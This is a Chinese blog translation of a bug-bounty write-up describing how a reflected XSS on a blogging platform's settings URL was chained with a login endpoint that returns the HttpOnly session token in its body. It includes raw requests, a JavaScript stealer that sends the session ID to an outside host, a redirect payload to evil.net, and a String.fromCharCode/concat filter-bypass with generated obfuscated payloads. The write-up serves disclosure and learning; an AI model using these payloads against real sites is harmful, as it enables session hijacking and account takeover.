---
title: 翻译Stealing HttpOnly Cookie via XSS
date: 2018-4-12 10:50:30
tags: Web安全
toc: true
---
> 本文首发[先知社区 HttpOnly Cookie via XSS](https://xz.aliyun.com/t/2266)
原文地址：https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81

通过XSS窃取HttpOnly Cookie

#### 你好
我写很少关于我发现，但我决定分享这些，这可能会帮助你，和POC。
首先说实话，我是最懒惰的黑客之一，我运行自己的脚本和常用工具，如wfuzz，sublister，nmap等，观看random电影，电影结束后我记得那些正在运行程序。
我对私人网站上的目录FUZZ，让我称之为jerico.com。jerico.com是一个流行的博客平台，拥有超过5亿用户。像往常一样，我用一个wordlist运行Wfuzz

		wfuzz -c -z file,/root/Desktop/common-list --hc 404,400,302 https://jerico.com/FUZZ
我很惊讶地看到服务器返回
200 OK 为以下目标点

		/account/settings/server
当我在浏览器中请求这个目标时，我看自己的帐户设置，我试图查看网站的源代码，并得出结论：‘server’ string 返回在一个script标签内。
```
<script> 
var user ='server'; 
</SCRIPT>
```
当然一个非常简单的payload是：
```
'-alert（2） - '
```
所以完整的网址是：
https://jerico.com/account/settings/server'-alert(2)-'
Boom，这是一个非常简单的XSS，幸运的.

	报告
	你好团队
	我在
	https://jerico.com/account/settings/server'-alert(2)-' 找到了一个xss，
	happy 修复。
	是的，我喜欢在没有进一步调查的情况下报告非常简单的问题，但这次团队没有反应，所以我决定引起他们一些注意。
对我来说有趣的一点是登录。
从我之前的调查中，我发现登录后返回会话cookie
```
set-cookie Header
in Response body
```
如果您尝试登录

		POST  /Account/Login HTTP/1.1
		HOST: jerico.com
		user[email]=fo@bar.com&user[password]=qwerty
response是：

		HTTP/1.1 200 OK
		Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc;
		secure;httpOnly;domain=jersico.com
		{"session":"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc"}
会话cookie被标记为httpOnly,So javascript不能操作它
但会话在响应体中返回，Javascript不能访问cookie，但它可以访问响应主体并获取受保护的cookie。
因此，要获取cookie，您需要post请求作为登录信息并获取响应body：

		POST  /Account/Login HTTP/1.1
		HOST: jerico.com
		ْX-Requested-With: XMLHttpRequest的
		user[email]=fo@bar.com&user[password]=qwerty
你在开玩笑吗 ？你将如何获得电子邮件和密码。
我试图在没有任何body参数的情况下向登录目标发出请求

		POST  /Account/Login HTTP/1.1
		Cookie: session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc;
		HOST: jerico.com
哇！
我很幸运，服务器在响应体中返回相同的数据：

		HTTP/1.1 200 OK
		Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc;
		secure;httpOnly;domain=jersico.com
		{"session":"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc"}
是的，这个计划进展顺利。

	发出XHR请求登录目标
	服务器在响应正文中返回sesssion id
	匹配body并窃取会话。
这里是完整的JS代码来窃取cookie
```
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { if (xhr.readyState == 4)
 
{
   prompt('You are hacked , your session='+xhr.response);}
   document.location.replace('//yassergersy.com/stealer?data='+xhr.response');
}
xhr.open('POST', '/account/login',true);
xhr.withCredentials = true;
xhr.send(null);
</script>
```
编码和发送payload失败:(大多数特殊字符被过滤：
```
",<>/\
```
对我来说，以下足以实现我的目标：
```
'()-.
```
我们需要将所有特殊字符转换为 String.fromCharCode(ascii)
空 = 32
```
String.fromCharCode(32)
```
逗号= 44
```
String.fromCharCode(44)
```
所以alert（1337）的payload将是：

	eval（String.fromCharCode（97,108,101,114,116,40,49,51,51,55,41））

等等，逗号被过滤，有效载荷再次失败，我们需要另一个技巧，我的jascript技能不是很好,我试图搜索谷歌,javascript string concatenation,并找到了concat()
https://www.w3schools.com/jsref/jsref_concat_string.asp
因此，我们可以使用连接它们而不是分隔字符 
```
.concat()
```
例如，如果我们需要通过 a,b
我们可以将b与使用连接起来：
```
'a'.concat（'b'）
```
当然，这个技巧不会用于字母字符，它将用于应用程序敏感的特殊字符
```
"<>/\,
```
所以使用concat和String.fromCharCode我们可以执行任何JS代码
我决定测试下面的有效载荷
```
<script>
       document.location.replace("//evil.net");
</script>
```
这太无聊了，手动完成，于是我决定编写一个python脚本使其更容易：
https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082
将payload保存到名为的文件payload.txt 并执行以下命令
```
python Js2S.py payload.txt
```
结果产生：
```
''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('document').concat(String.fromCharCode(46)).concat('location').concat(String.fromCharCode(46)).concat('replace').concat(String.fromCharCode(40)).concat(String.fromCharCode(34)).concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat('evil').concat(String.fromCharCode(46)).concat('net').concat(String.fromCharCode(34)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10))
```
这个生成的payload被认为是一个单独的字符串，不会被应用程序过滤，所以我们可以将它传递给eval并执行它
在他的情况下，我需要将这个payload写入文件中。
所以我会用 document.write(my_payload)
而不是eval，任何人都可以使用的任何功能。
所以我们的最终payload是：
```
https://jerico.com/Account/Settings/server`-dcument.write( <<generated-payload-by-python-script>>)'-
```
成功：D，让我们试试payload：
```
$cat myrealworldpayload.txt
```
```
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { if (xhr.readyState == 4)
 {prompt('You are hacked , your session='+xhr.response);}}
xhr.open('POST', '/account/login', true);
xhr.send(null);
</script>
```
和python脚本生成以下内容：
```
python Js2S.py myrealworldpayload.txt
```
output
```
''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('var').concat(String.fromCharCode(32)).concat('xhr').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('new').concat(String.fromCharCode(32)).concat(String.fromCharCode(88)).concat('MLHttpRequest').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('onreadystatechange').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('function').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat(String.fromCharCode(32)).concat('if').concat(String.fromCharCode(32)).concat(String.fromCharCode(40)).concat('xhr').concat(String.fromCharCode(46)).concat('readyState').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('4').concat(String.fromCharCode(41)).concat(String.fromCharCode(10)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat('prompt').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat(String.fromCharCode(89)).concat('ou').concat(String.fromCharCode(32)).concat('are').concat(String.fromCharCode(32)).concat('hacked').concat(String.fromCharCode(32)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('your').concat(String.fromCharCode(32)).concat('session').concat(String.fromCharCode(61)).concat(String.fromCharCode(39)).concat(String.fromCharCode(43)).concat('xhr').concat(String.fromCharCode(46)).concat('response').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(125)).concat(String.fromCharCode(125)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('open').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat('POST').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat(String.fromCharCode(39)).concat(String.fromCharCode(47)).concat('account').concat(String.fromCharCode(47)).concat('login').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('true').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('send').concat(String.fromCharCode(40)).concat('null').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10))
```
现在将下面的url中xxxxxxxxxx替换为生成的payload：
```
https://jerico.com/Account/Settings/server`-dcument.write( <<xxxxxxxxxxxxx>>)'-
```
payload太长，url，但它并不重要：
我能够窃取cookie。
![](https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/img/xss-httponly.png)

### 结论：
我发给团队的最后的POC，过程？

执行payload，首先在脚本标签内回显。
payload首先作为数学运算执行，因为我使用' - 作为减法运算，它首先会将完整的恶意payload添加到要在没有过滤的情况下执行的文档中。
payload执行并发出一个POST请求，并提取响应以提取会话ID并将其发送给攻击者网站 http://yassergersy.com， 后者将按照上图中的提示进行提示。
攻击者网站收到被盗的会话ID并记录下来。

learn：

Think in the box :D
Chain bugs for higher impact.
Never stop searching

Timeline

4–2–2018 Reported
5–2–2018 Triaged
The bounty was frustrating :(
Regards